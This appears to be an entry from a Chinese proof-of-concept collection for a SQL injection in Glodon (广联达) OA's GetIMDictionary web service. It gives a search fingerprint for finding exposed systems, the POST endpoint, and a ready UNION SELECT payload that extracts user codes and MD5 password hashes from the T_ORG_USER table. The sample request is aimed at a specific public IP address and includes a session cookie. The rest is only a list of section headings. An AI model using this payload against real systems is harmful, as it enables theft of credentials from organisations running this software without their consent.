# 广联达OAGetIMDictionarySQL注入漏洞

- **系统**：广联达OAGetIMDictionary　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="广联达 OA"`
- **请求**：`POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1`

**请求体 / payload**
```
可通过POC获取存在账号密码的MD5值
Host: 27.147.184.214:8888
Cookie: ASP.NET_SessionId=iq02bz1sdodmt2z0ox1rjnqy; GTP_IdServer_LangID=2052
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
>
```

**其他**
- 广联达OA GetIMDictionarySQL注入漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + 广联达办公OA